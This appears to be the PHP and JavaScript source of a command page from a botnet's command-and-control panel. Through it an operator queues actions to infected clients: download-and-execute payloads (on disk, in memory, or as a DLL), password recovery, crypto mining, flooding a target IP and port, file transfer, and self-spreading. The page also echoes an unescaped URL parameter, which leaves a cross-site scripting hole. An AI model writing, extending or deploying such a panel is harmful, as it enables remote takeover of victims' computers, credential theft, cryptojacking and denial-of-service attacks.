<?php
if((!isset($_SESSION['user'])) or (!isset($_SESSION['permission']))){
	header('Location: index.php');
	exit;
}
if($_SESSION['permission']=='Master') {
?>
<form method="get" action="dashboard.php" class="actionform">
	<h3><p>Get Command List</p></h3>
	<input type="text" name="GUID" placeholder="GUID" style="width: 400px;">
	<input type="submit" value="Get" style="width: 70px;">
	<input type="hidden" name="tab" value="Commands">
	<input type="hidden" name="silent" value="1">
</form>
<form method="post" action="queue.php" class="actionform">
	<h3><p>Perform a Command</p></h3>
	<p>Target</p>
	<select id="ptSel" name="Target" style="width: 200px; margin-bottom: 10px; text-align: center;">
		<option selected disabled hidden>Select a Target</option>
		<option>Single Client</option>
		<option>All Clients</option>
		<option>Online Clients</option>
		<option>Offline Clients</option>
	</select><br>
	<input id="pGUID" type="text" name="GUID" placeholder="GUID" style="width: 400px; margin-bottom: 10px;">
	<p>Command</p>
	<select id="pcSel" name="Command" style="width: 300px; margin-bottom: 10px; text-align: center;">
		<option selected disabled hidden>Select a Command</option>
		<optgroup label="⚗️ Binary Commands">
			<option>Restart Client</option>
			<option>Update Client</option>
			<option>Update Secondary Mapping</option>
			<option>Uninstall Client</option>
		</optgroup>
		<optgroup label="📁 Files">
			<option>Download File</option>
			<option>Upload File</option>
		</optgroup>
		<optgroup label="🎆 Exploits">
			<option>Download and Execute [Drop]</option>
			<option>Download and Execute [Memory]</option>
			<option>Download and Execute [DLL]</option>
			<option>Recover Passwords</option>
			<option>Start Mining</option>
			<option>Start Flooding</option>
			<option>Open URL</option>
		</optgroup>
		<optgroup label="🕸️ Spreading">
			<option>Enable Spreading</option>
		</optgroup>
		<option>🛑 Abort a Command</optgroup>
	</select>
	<div id="Params">
		<br>
		<p>Parameters</p>
		<span id="Param1">Param1</span>
		<input type="text" name="Param1" id="iParam1" style="width: 200px; margin-left: 10px; display: none;" autocomplete="off"><br>
		<span id="Param2">Param1</span>
		<input type="text" name="Param2" id="iParam2" style="width: 200px; margin-left: 10px; display: none;" autocomplete="off">
	</div><br>
	<?php
	if(isset($_GET['success']))
		echo('<br/><center><p class="success" style="width:50%;">Command queued successfully.</p></center>');
	else if(isset($_GET['failure'])){
		echo('<br/><center><p class="error" style="width:50%;">' . $_GET['failure'] . '</p></center>');
	}
	?>
	<br><input type="submit" value="Perform" style="width: 80px;">
</form>

<script>

function Toggle(n, b){
	$('#i' + n).prop('disabled', !b);
	if(b){
		$('#' + n).show();
		$('#i' + n).val('');
		$('#i' + n).show();
	} else {
		$('#' + n).hide();
		$('#i' + n).hide();
	}
}

$(function() {
	//Set defaults
	$('#pGUID').hide();
	$('#Params').hide();
	//Show the GUID edit if necessary
    $('#ptSel').change(function(){
        if($('#ptSel').val() == 'Single Client') {
			$('#pGUID').prop('disabled', false); 
            $('#pGUID').show(); 
        } else {
			$('#pGUID').prop('disabled', true); 
            $('#pGUID').hide(); 
        } 
    });
	//Show and update the Params section if necessary
	$('#pcSel').change(function(){
		var paramCount = 0;
		switch($('#pcSel').val()){
			case 'Download File':{
				$('#Param1').text('URL');
				$('#Param2').text('Local Name');
				paramCount = 2;
			} break;
			case 'Start Flooding':{
				$('#Param1').text('IP Address');
				$('#Param2').text('Port');
				paramCount = 2;
			} break;
			case 'Upload File':{
				$('#Param1').text('Local Name');
				paramCount = 1;
			} break;
			case 'Update Secondary Mapping':
			case 'Update Client':
			case 'Open URL':
			case 'Download and Execute [Drop]':
			case 'Download and Execute [Memory]':
			case 'Download and Execute [DLL]':{
				$('#Param1').text('URL');
				paramCount = 1;
			} break;
			case 'Start Mining':{
				$('#Param1').text('Bitness (64/32)');
				paramCount = 1;
			} break;
			case '🛑 Abort a Command':{
				$('#Param1').text('Command ID');
				paramCount = 1;
			} break;
			case 'Uninstall Client':{
				$('#Param1').text('Uninstall key');
				paramCount = 1;
			} break;
		}
		if(paramCount==0){
			Toggle('Param1', false);
			Toggle('Param2', false);
			$('#Params').hide();
		} else {
			var i;
			for(i = 1; i<=paramCount; i++){
				Toggle('Param' + i, true);
			}
			for(i = paramCount + 1; i<=2; i++){
				Toggle('Param' + i, false);
			}
			$('#Params').show();
		}
	});
});
</script>
<?php
	} else echo('<p style="color: #ffffff">You do not have permission to control clients.</p>');
?>